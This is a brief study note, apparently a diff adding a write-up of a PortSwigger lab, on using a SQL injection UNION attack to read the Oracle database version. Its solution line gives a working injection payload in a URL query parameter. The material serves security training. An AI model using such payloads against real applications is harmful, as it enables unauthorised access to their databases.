@@ -1,0 +1,15 @@
+SQL injection attack, querying the database type and version on oracle
+https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle
+https://ranakhalil.teachable.com/courses/1491236/lectures/34259848
+
+End Goal: Use union attack to retrieve the database version from an injected query.
+
+
+Analysis:
+---------
+1. Determine number of columns: Itterate with Order By
+2. Determine database version: SELECT banner from v$version 
+
+Solution:
+---------
+/filter?category=Corporate+gifts'+UNION+SELECT+NULL,banner+FROM+v$version--
